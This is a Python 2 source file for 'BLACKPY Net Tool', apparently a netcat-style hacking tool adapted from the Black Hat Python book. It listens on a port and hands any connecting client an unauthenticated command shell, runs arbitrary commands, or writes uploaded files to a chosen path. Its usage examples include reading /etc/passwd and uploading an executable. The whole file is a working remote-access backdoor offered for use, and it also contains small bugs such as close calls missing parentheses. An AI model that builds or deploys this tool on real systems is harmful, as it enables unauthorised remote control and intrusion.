import sys
import socket
import getopt
import threading
import subprocess

# define some global variables
listen             = False
command            = False
upload             = False
execute            = ""
target             = ""
upload_destination = ""
port               = 0

#usage: to guide the user how to use this programe
def usage():
   print "BLACKPY Net Tool\n\n"
   

   print "Usage: blackpypnet.py -t target_host -p port"
   print "-l --listen              - listen on [host]:[port] for ", \
         "incoming connections"
   print "-e --execute=file_to_run - execute the given file upon ", \
         "receiving a connection"
   print "-c --command             - initialize a command shell"
   print "-u --upload=destination  - upon receiving connection upload a ", \
         "file and write to [destination]\n\n"


   print "Examples:\nblackpynet.py -t 192.168.0.1 -p 5555 -l -c\n", \
         "blackpynet.py -t 192.168.0.1 -p 5555 -l -c\n", \
         "blackpynet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe\n", \
         "blackpynet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"\n", \
         "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
   sys.exit(0)

def client_sender(buffer):
   client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

   try:
      #connect to target host
      client.connect((target,port))

      if len(buffer):
         client.send(buffer)

      while True:
         #wit for data back
         recv_len = 1
         response = ""

         while recv_len:
            data = client.recv(4096)
            recv_len = len(data)
            response += data
            
            if recv_len < 4096:
               break
         print response,

         # wait for more input
         buffer = raw_input("")
         buffer += "\n"

         #send it off
         client.send(buffer)

   except:
      print "[*] Exception! Exiting.."
      #tear down the connection
      client.close

def server_loop():
   global target

   #if no target is definded -> listen on all interface
   if not len(target):
      target = "0.0.0.0"
   server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   server.bind((target,port))
   server.listen(5)

   while True:
      client_socket,addr = server.accept()

      #spin off a thread to handle our new client
      client_thread = threading.Thread(target=client_handler,args=(client_socket,))
      client_thread.start()

def run_command(command):
   #trim the newline
   command = command.rstrip()

   #run the command and get the output back
   try:
      output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
   except:
      output = "Faild to execute command.\r\n"

   return output

def client_handler(client_socket):
   global upload
   global execute
   global command

   #check for upload
   if len(upload_destination):

      #read in all of the bytes and wtite to our destination
      file_buffer = ""

      #keep reading data until none is available
      while True:
         data = client_socket.recv(1024)

         if not data:
            break
         else:
            file_buffer += data

      try:
         file_descriptor = open(upload_destination,"wb")
         file_descriptor.write(file_buffer)
         file_descriptor.close

         #finish writing the file
         client_socket.send("Successfully saved file to %s\r\n" %upload_destination)
      except:
         client_socket.send("Filed saved file to %s\r\n" %upload_destination)

   #check for command execution
   if len(execute):
      
      #run the command
      output = run_command(execute)
      client_socket.send(output)

   #another loop when command shell was requested
   if command:

      while True:
         #display a simple prompt
         client_socket.send("<BlackPy:#> ")
         
         #receive until user press <ENTER>
         cmd_buffer = ""
         
         while "\n" not in cmd_buffer:
            cmd_buffer += client_socket.recv(1024)

         #send back the command output
         response = run_command(cmd_buffer)

         #send back the response
         client_socket.send(response)

#main
def main():
   global listen
   global port
   global execute
   global command
   global upload_destination
   global target

   if not len(sys.argv[1:]):
      usage()

   #read the command line option
   try:
      opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu", \
                  ["help","listen","execute","target","port","command","upload"])
   except getopt.GetoptError as err:
      print str(err)
      usage()
   for o,a in opts:
      if o in ("-h","--help"):
         usage()
      elif o in ("-l","--listen"):
         listen = True
      elif o in ("-e","--execute"):
         execute = a
      elif o in ("-c", "--commandshell"):
         command = True
      elif o in ("-t", "--target"):
         target =  a
      elif o in ("-u", "--upload"):
         upload_destination = a
      elif o in ("-p", "--port"):
         port = int(a)
      else:
         assert False,"Invaild Option"

   #listen or send data from stdin?
   if not listen and len(target) and port > 0:

      #read in the buffer from the commandline
      #this will bloack, so send CTRL-D if not sending input to stdin
      buffer = sys.stdin.read()
      
      #send data off
      client_sender(buffer)
   
   #listen and pontentailly, uploard things, execute commands
   #and drop a shell back depending on our commanline
   if listen:
      server_loop()
      
main()
